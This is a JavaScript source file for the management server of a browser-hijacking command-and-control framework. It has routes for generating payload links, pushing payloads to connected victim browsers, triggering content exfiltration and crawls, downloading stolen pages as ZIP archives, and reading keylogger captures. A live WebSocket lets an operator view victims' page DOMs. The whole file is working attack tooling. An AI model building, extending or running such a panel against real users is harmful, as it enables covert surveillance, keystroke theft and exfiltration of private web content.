import http from "node:http";
import crypto from "node:crypto";
import path from "node:path";
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import express from "express";
import { WebSocketServer } from "ws";
import archiver from "archiver";
import { requireClient, requireLink } from "./middleware.js";
import { WS_OPEN, broadcast } from "./ws-utils.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/**
 * Creates the management server.
 * Handles: viewer WebSocket (/view), REST API (/api/*), test site (/test*), React SPA
 * @param {ReturnType<import("./state.js").createState>} state
 * @returns {{ app: import("express").Application, server: import("http").Server }}
 */
export function createManagementServer(state, opts = {}) {
  const { db, payloadHandlers, activeClients, logViewers, storeLog } = state;
  const c2Server = opts.c2Server || null;

  const app = express();
  app.use(express.json());
  const server = http.createServer(app);
  const viewerWss = new WebSocketServer({ noServer: true });

  server.on("upgrade", (req, socket, head) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    if (url.pathname === "/view") {
      viewerWss.handleUpgrade(req, socket, head, (ws) => {
        viewerWss.emit("connection", ws, req);
      });
    } else {
      socket.destroy();
    }
  });

  // Viewer WebSocket: dashboards and live-view pages subscribe here.
  // Payload viewer: /view?id=<clientId>&payload=<name>
  // Log viewer:     /view?payload=logs  or  /view?id=<clientId>&payload=logs
  viewerWss.on("connection", (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const clientId = url.searchParams.get("id");
    const payloadName = url.searchParams.get("payload") || "domviewer";

    if (payloadName === "logs") {
      const viewer = { ws, clientId: clientId || null };
      logViewers.add(viewer);

      // Send initial batch from DB
      const logs = clientId
        ? db.getClientLogs(clientId, 200)
        : db.getGlobalLogs(500);
      ws.send(JSON.stringify({ type: "init", logs }));

      ws.on("close", () => logViewers.delete(viewer));
      return;
    }

    if (!clientId) {
      ws.close();
      return;
    }

    // Look up the handler first — unknown payload type always rejects regardless of client state
    const handler = payloadHandlers[payloadName];
    if (!handler) {
      ws.close();
      return;
    }

    let handlerState;

    if (activeClients.has(clientId)) {
      // Client is live — use its active handler state
      handlerState = activeClients.get(clientId).payloads[payloadName];
      if (!handlerState) {
        // Payload is registered but not currently loaded on this client
        ws.close();
        return;
      }
    } else {
      // Client is offline (or unknown). Check DB — spider results are persisted so viewers
      // can still browse them after a disconnect. Domviewer shows "No DOM captured yet"
      // (ephemeral Yjs state is always empty for offline clients).
      const clientRecord = db.getClient(clientId);
      if (!clientRecord) {
        ws.close();
        return;
      }
      // Only allow viewing payloads that the client actually had enabled
      if (!clientRecord.payloads.includes(payloadName)) {
        ws.close();
        return;
      }
      // Create ephemeral handler state for this viewer session only.
      // It is NOT added to activeClients and is GC'd when the viewer disconnects.
      handlerState = handler.initState(db, clientId, storeLog);
    }

    handler.onViewerConnect(handlerState, ws);
  });

  /**
   * Returns the active client entry if it exists and its WebSocket is OPEN, or null otherwise.
   * Used by routes that need to forward messages to a live client.
   * @param {string} clientId
   * @returns {{ ws: import("ws").WebSocket, payloads: object } | null}
   */
  function getOpenClient(clientId) {
    const entry = activeClients.get(clientId);
    return entry && entry.ws.readyState === WS_OPEN ? entry : null;
  }

  // ---------- API Routes ----------

  /** GET /api/config — Returns server configuration for the frontend. */
  app.get("/api/config", (req, res) => {
    const c2Port = c2Server?.address()?.port;
    const c2Url = c2Port
      ? `${req.protocol}://${req.hostname}:${c2Port}`
      : null;
    res.json({ c2Url });
  });

  /** POST /api/links — Create a new payload link. */
  app.post("/api/links", (req, res) => {
    const rawPayloads = req.body.payloads;
    const payloads = rawPayloads !== undefined
      ? rawPayloads.filter((p) => payloadHandlers[p])
      : ["domviewer"];
    if (rawPayloads?.length > 0 && payloads.length === 0) {
      res.status(400).json({ error: "No valid payloads specified" });
      return;
    }

    const redirectUri = req.body.redirectUri || null;
    const config = req.body.config && typeof req.body.config === "object" ? req.body.config : {};
    const linkId = crypto.randomUUID();
    db.insertLink(linkId, payloads, redirectUri, config);
    res.json({ id: linkId, payloads, redirectUri, config });
  });

  /**
   * PATCH /api/links/:id — Update enabled payloads and/or redirectUri for a link.
   * This only updates the DB template used for new clients; it does NOT push changes
   * to already-connected clients (use PATCH /api/clients/:id for that).
   */
  app.patch("/api/links/:id", requireLink(db), (req, res) => {
    const linkId = req.params.id;

    const rawPayloads = req.body.payloads;
    let newPayloads;
    if (rawPayloads !== undefined) {
      newPayloads = rawPayloads.filter((p) => payloadHandlers[p]);
      if (rawPayloads.length > 0 && newPayloads.length === 0) {
        res.status(400).json({ error: "No valid payloads specified" });
        return;
      }
      db.updateLinkPayloads(linkId, newPayloads);
    }
    if (req.body.redirectUri !== undefined) {
      db.updateLinkRedirectUri(linkId, req.body.redirectUri || null);
    }
    if (req.body.config !== undefined && typeof req.body.config === "object") {
      db.updateLinkConfig(linkId, req.body.config);
    }

    const updatedLink = db.getLink(linkId);
    res.json({ id: linkId, payloads: updatedLink?.payloads ?? [], config: updatedLink?.config || {} });
  });

  /**
   * DELETE /api/links/:id — Delete a link record.
   * Clients that were created from this link are left intact; once connected,
   * a client is independent of its originating link.
   */
  app.delete("/api/links/:id", requireLink(db), (req, res) => {
    db.deleteLink(req.params.id);
    res.json({ ok: true });
  });

  /** GET /api/links/:id — Get a single link. */
  app.get("/api/links/:id", requireLink(db), (req, res) => {
    res.json(req.link);
  });

  /** GET /api/links — List all links. */
  app.get("/api/links", (_req, res) => {
    res.json(db.getAllLinks());
  });

  /** GET /api/clients — List all clients enriched with live connection status. */
  app.get("/api/clients", (_req, res) => {
    const clients = db.getAllClients().map((c) => {
      const active = activeClients.get(c.id);
      const activePayloads = active ? Object.keys(active.payloads) : [];
      return { ...c, connected: activeClients.has(c.id), activePayloads };
    });
    res.json(clients);
  });

  /** GET /api/clients/:id — Get a single client with live connection status. */
  app.get("/api/clients/:id", requireClient(db), (req, res) => {
    const active = activeClients.get(req.client.id);
    const activePayloads = active ? Object.keys(active.payloads) : [];
    res.json({
      ...req.client,
      connected: activeClients.has(req.client.id),
      activePayloads,
    });
  });

  /**
   * PATCH /api/clients/:id — Update a client's enabled payloads and/or config.
   * If the client is currently connected, load/unload/config messages are pushed immediately.
   * If disconnected, changes persist in DB and take effect on next reconnect.
   *
   * Config delivery: initial config is sent inside { type: "load", config } (bootstrap path,
   * handled during C2 handshake). Live config updates from this endpoint arrive via
   * { type: "payload", data: { type: "config" } } for already-loaded payloads (runtime path).
   */
  app.patch("/api/clients/:id", requireClient(db), (req, res) => {
    const clientId = req.params.id;
    const c = req.client;

    // --- Payload list update ---
    let newPayloads = c.payloads;
    if (req.body.payloads !== undefined) {
      const rawPayloads = req.body.payloads;
      newPayloads = rawPayloads.filter((p) => payloadHandlers[p]);
      if (rawPayloads.length > 0 && newPayloads.length === 0) {
        res.status(400).json({ error: "No valid payloads specified" });
        return;
      }
      db.updateClientPayloads(clientId, newPayloads);
    }

    // --- Config update ---
    let newConfig = c.config || {};
    if (req.body.config !== undefined && typeof req.body.config === "object") {
      newConfig = { ...newConfig, ...req.body.config };
      db.updateClientConfig(clientId, newConfig);
    }

    const oldSet = new Set(c.payloads);
    const newSet = new Set(newPayloads);
    const added = newPayloads.filter((p) => !oldSet.has(p));
    const removed = c.payloads.filter((p) => !newSet.has(p));

    // If the client is connected, push payload and config changes immediately.
    // The state helpers (loadPayloadOnClient, unloadPayloadFromClient, sendPayloadMessage)
    // handle the connectivity check internally, so no explicit openEntry guard is needed.
    const isConnected = !!getOpenClient(clientId);
    if (isConnected) {
      // Load new payloads (sends load message with per-payload config)
      for (const name of added) {
        state.loadPayloadOnClient(clientId, name, newConfig[name] || {});
      }
      // Unload removed payloads
      for (const name of removed) {
        state.unloadPayloadFromClient(clientId, name);
      }
      // Push live config updates to payloads that were already loaded (not newly added).
      // Newly added payloads received their config in the load message above.
      if (req.body.config !== undefined) {
        for (const name of Object.keys(req.body.config)) {
          if (newSet.has(name) && !added.includes(name)) {
            state.sendPayloadMessage(clientId, name, { type: "config", ...newConfig[name] });
          }
        }
      }
    }

    res.json({ id: clientId, payloads: newPayloads, config: newConfig });
  });

  /**
   * DELETE /api/clients/:id — Delete a client.
   * If connected, the client receives a { type: "destroy" } message before being disconnected.
   * Cascades to logs and spider results.
   */
  app.delete("/api/clients/:id", requireClient(db), (req, res) => {
    state.destroyClient(req.params.id);
    db.deleteClient(req.params.id);
    res.json({ ok: true });
  });

  /** GET /api/clients/:id/logs — Get logs for a specific client. */
  app.get("/api/clients/:id/logs", requireClient(db), (req, res) => {
    const limit = parseInt(req.query.limit, 10) || 200;
    res.json(db.getClientLogs(req.params.id, limit));
  });

  /** GET /api/logs — Get global logs. */
  app.get("/api/logs", (req, res) => {
    const limit = parseInt(req.query.limit, 10) || 500;
    res.json(db.getGlobalLogs(limit));
  });

  // ---------- Spider Content Routes ----------

  /**
   * GET /api/clients/:id/spider/content?url=<encoded>
   * List all stored content versions for a specific URL (metadata only, no body).
   */
  app.get("/api/clients/:id/spider/content", requireClient(db), (req, res) => {
    const url = req.query.url;
    if (!url) {
      res.status(400).json({ error: "url query parameter is required" });
      return;
    }
    const versions = db.getSpiderContentVersions(req.params.id, url);
    res.json(versions);
  });

  /**
   * GET /api/clients/:id/spider/content/latest?url=<encoded>
   * Redirect to the latest stored content version for a URL.
   * Returns 404 if no content exists.
   * Must be registered before /:contentId to prevent "latest" matching as a numeric ID.
   */
  app.get("/api/clients/:id/spider/content/latest", requireClient(db), (req, res) => {
    const url = req.query.url;
    if (!url) {
      res.status(400).json({ error: "url query parameter is required" });
      return;
    }

    const latestId = db.getSpiderContentLatest(req.params.id, url);
    if (latestId === null) {
      res.status(404).json({ error: "No content found for the given URL" });
      return;
    }

    res.redirect(`/api/clients/${req.params.id}/spider/content/${latestId}`);
  });

  /**
   * GET /api/clients/:id/spider/content/:contentId
   * Download a single stored content blob by its database ID.
   * Returns the raw body with the original Content-Type header.
   */
  app.get("/api/clients/:id/spider/content/:contentId", requireClient(db), (req, res) => {
    const row = db.getSpiderContentById(parseInt(req.params.contentId, 10));
    if (!row || row.client_id !== req.params.id) {
      res.status(404).json({ error: "Content not found" });
      return;
    }
    res.setHeader("Content-Type", row.content_type || "application/octet-stream");
    res.setHeader("Content-Disposition", "inline");
    res.send(row.content);
  });

  /**
   * GET /api/clients/:id/spider/download?path=<urlPrefix>
   * Download a ZIP archive of all stored content whose URL starts with the given prefix.
   * For each URL only the latest version (by fetched_at) is included.
   * Filenames inside the ZIP are derived from the URL path.
   */
  app.get("/api/clients/:id/spider/download", requireClient(db), (req, res) => {
    const urlPrefix = req.query.path || "";
    const rows = db.getSpiderContentByPrefix(req.params.id, urlPrefix);

    if (rows.length === 0) {
      res.status(404).json({ error: "No content found for the given path prefix" });
      return;
    }

    // Derive a download filename from the URL prefix (e.g. "example.com-admin.zip")
    let archiveName = "spider-content";
    try {
      const parsed = new URL(urlPrefix);
      // Start with the hostname, then append any non-trivial path segments
      const pathPart = parsed.pathname.replace(/\/+$/, "").replace(/^\//, "");
      archiveName = pathPart
        ? `${parsed.hostname}-${pathPart.replace(/\//g, "-")}`
        : parsed.hostname;
    } catch {
      // urlPrefix is not a full URL (e.g. a bare path); sanitise it directly
      if (urlPrefix) {
        archiveName = urlPrefix.replace(/^\/+|\/+$/g, "").replace(/\//g, "-") || "spider-content";
      }
    }
    // Strip characters that are unsafe in filenames
    archiveName = archiveName.replace(/[^a-zA-Z0-9._-]/g, "_");

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="${archiveName}.zip"`);

    const archive = archiver("zip", { zlib: { level: 6 } });
    archive.on("error", (err) => {
      console.error("[download] archiver error:", err);
      // Headers already sent — just destroy the response stream
      res.destroy();
    });
    archive.pipe(res);

    // Deduplicate: keep only the latest version per URL (rows are sorted url ASC, fetched_at DESC)
    const seen = new Set();
    for (const row of rows) {
      if (seen.has(row.url)) continue;
      seen.add(row.url);

      // Derive a filename from the URL path, stripping the leading slash
      let filePath;
      try {
        const parsed = new URL(row.url);
        filePath = parsed.hostname + parsed.pathname;
        // Ensure index files get a sensible name
        if (filePath.endsWith("/")) filePath += "index.html";
      } catch {
        filePath = row.url.replace(/[^a-zA-Z0-9._-]/g, "_");
      }

      // Fetch the full blob by ID and append to the archive
      const full = db.getSpiderContentById(row.id);
      if (full) {
        archive.append(Buffer.from(full.content), { name: filePath });
      }
    }

    archive.finalize();
  });

  /**
   * POST /api/clients/:id/spider/exfiltrate
   * Trigger manual content exfiltration for a list of URLs.
   * Forwards { type: "exfiltrate", urls } to the connected client.
   * Returns 409 if the client is not currently connected.
   */
  app.post("/api/clients/:id/spider/exfiltrate", requireClient(db), (req, res) => {
    const urls = req.body.urls;
    if (!Array.isArray(urls) || urls.length === 0) {
      res.status(400).json({ error: "urls array is required" });
      return;
    }

    const openEntry = getOpenClient(req.params.id);
    if (!openEntry) {
      res.status(409).json({ error: "Client is not connected" });
      return;
    }

    state.sendPayloadMessage(req.params.id, "spider", { type: "exfiltrate", urls });

    storeLog(req.params.id, {
      level: "info",
      source: "spider",
      message: `Exfiltrate dispatched: ${urls.length} URL(s)`,
      timestamp: Date.now(),
    });

    res.json({ ok: true, queued: urls.length });
  });

  /**
   * POST /api/clients/:id/spider/crawl
   * Trigger a re-crawl from one or more seed URLs.
   * Forwards { type: "crawl", seeds } to the connected client.
   * Returns 409 if the client is not currently connected.
   */
  app.post("/api/clients/:id/spider/crawl", requireClient(db), (req, res) => {
    const seeds = req.body.seeds;
    if (!Array.isArray(seeds) || seeds.length === 0) {
      res.status(400).json({ error: "seeds array is required" });
      return;
    }

    const openEntry = getOpenClient(req.params.id);
    if (!openEntry) {
      res.status(409).json({ error: "Client is not connected" });
      return;
    }

    state.sendPayloadMessage(req.params.id, "spider", { type: "crawl", seeds });

    storeLog(req.params.id, {
      level: "info",
      source: "spider",
      message: `Re-crawl dispatched: ${seeds.length} seed URL(s)`,
      timestamp: Date.now(),
    });

    res.json({ ok: true, seeds: seeds.length });
  });

  // ---------- Keylogger Routes ----------

  /** GET /api/clients/:id/keylogger/entries — Fetch all persisted keylogger entries as JSON. */
  app.get("/api/clients/:id/keylogger/entries", requireClient(db), (req, res) => {
    res.json(db.getKeyloggerEntries(req.params.id));
  });

  /**
   * POST /api/clients/:id/keylogger/clear — Delete all entries and notify connected viewers.
   */
  app.post("/api/clients/:id/keylogger/clear", requireClient(db), (req, res) => {
    db.clearKeyloggerEntries(req.params.id);
    // Notify any connected viewers so they can clear their local state
    const active = activeClients.get(req.params.id);
    if (active?.payloads?.keylogger?.viewers) {
      broadcast(active.payloads.keylogger.viewers, JSON.stringify({ type: "cleared" }));
    }
    res.json({ ok: true });
  });

  // Serve multi-page test site for domviewer/spider testing.
  // Pages are static — the user manually pastes the payload <script> tag via the inject form on index.html.
  const testDir = path.join(__dirname, "test");

  app.get("/test*", (req, res) => {
    let rel = req.path.replace(/^\/test\/?/, "") || "index";
    let filePath = path.join(testDir, rel + ".html");
    if (!fs.existsSync(filePath)) {
      filePath = path.join(testDir, rel, "index.html");
    }
    if (!fs.existsSync(filePath)) {
      res.status(404).send("Test page not found");
      return;
    }
    res.type("text/html").sendFile(filePath);
  });

  // Serve the React SPA (production build)
  const webDistPath = path.join(__dirname, "..", "dist", "web");
  app.use(express.static(webDistPath));

  // SPA fallback: serve index.html for any unmatched GET
  app.get("*", (_req, res) => {
    const indexPath = path.join(webDistPath, "index.html");
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      res.status(404).send("Web UI not built yet — run: npm run build:all");
    }
  });

  return { app, server };
}
